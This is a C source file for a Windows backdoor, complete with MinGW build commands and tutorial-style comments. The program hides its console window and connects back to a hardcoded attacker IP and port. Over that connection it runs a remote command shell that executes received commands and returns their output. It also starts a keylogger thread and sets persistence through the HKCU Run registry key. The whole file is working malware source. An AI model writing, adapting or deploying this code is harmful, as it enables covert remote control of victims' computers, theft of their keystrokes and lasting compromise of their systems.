// gcc backdoor.c -o malware.exe -lwsock32 -lwininet   -< command to run in windows mingw
// i686-w64-mingw32-gcc -o malware.exe backdoor.c -lwsock32 -lwininet       <- command to run in linux 

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<winsock2.h>
#include<windows.h>
#include<winuser.h>
#include<wininet.h>
#include<windowsx.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include "keylogger.h"

#define bzero(p,size) (void) memset((p), 0 ,(size))
int sock;


int bootRun(){
    char err[128]  = "Failed\n";
    char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;  // unsigned 32 bit data type

    pathLen = GetModuleFileName(NULL,szPath, MAX_PATH);
    if (pathLen == 0){
        send(sock, err, sizeof(err),0);
        return -1;
    }
    HKEY NewVal;

    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal )!= ERROR_SUCCESS){
        send(sock,err, sizeof(err), 0);
        return -1;
    }
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);

    if(RegSetValueEx(NewVal, TEXT("Hacked"),0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc) , 0);
    return 0;

}


char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}


void Shell()
{
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while(1){
        jump:
        bzero(buffer,sizeof(buffer));
        bzero(container,sizeof(container));
        bzero(total_response,sizeof(total_response));
        recv(sock,buffer,1024,0);       //response from the server  is stored in buffer

        if(strncmp("quit", buffer, 4) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if(strncmp("cd ",buffer,3) == 0){
                chdir(str_cut(buffer,3,100));
        }
        else if(strncmp("persist",buffer,7) == 0)   {
            bootRun();
        }
        else if(strncmp("keylog_start", buffer,12) ==0){
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            goto jump;
        }
        else {
            FILE *fp;
            fp = _popen(buffer,"r");         // we are executing the command container inside buffer and response is saved inside fp
            while(fgets(container,1024,fp) != NULL) {
                strcat(total_response,container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}
// HINSTANCE is a handle to an instance or a handle to a module
// The operating system uses this value to identify the executable when it's loaded
// in memory and also the instance handle is needed for some windows function
// hPrev has no meaning now it was used for 16-bit windows but now it's always 0.
// lpCmdline contains the command line arguments such as unicode string
// nCmdShow is a flag that says whether the main application window will be minimized or 
// maximized or shown normally

int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrev, LPSTR lpCmdLine,int nCmdShow)
{
    HWND stealth;       // we are creating a handle to windows that is not visible to the target
    AllocConsole();     /* this will allocate a new console to the calling process
                            and takes no parameter */
    
    stealth = FindWindowA("ConsoleWindowClass",NULL);   /* this function retrieves a handle to the 
                                                        top level window .!st argument is the class name
                                                        and 2nd argument is the window name and here we take 
                                                        the window name as null*/

    ShowWindow(stealth,0);      /* here we have called this to set to show our window or not
                            we are passing two arguments
                            1st argument is the handle to the window
                            2nd argument is nCmdShow ,here 0 because we are hiding window and
                            activating another window*/

    struct sockaddr_in ServAddr;

    unsigned short ServPort;
    char *ServIP;
    WSADATA  wsaData;       // WSADATA is a structure that contains information about windows socket.
                            // this is must in order to establish a socket connection to a Windows Machine

    ServIP = "192.168.43.9";  //Ip addr of server
    ServPort = 50005;

    if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
    {
        exit(1);
    }

    sock = socket(AF_INET,SOCK_STREAM,0);
    memset(&ServAddr, 0 , sizeof(ServAddr));       // clears the memory with 0
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);   // to convert string to ip address
    ServAddr.sin_port = htons(ServPort);    // to convert port to hexport


    start:
    while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
    {
        Sleep(10);
        goto start;
    }

    MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"),TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
    Shell();

}
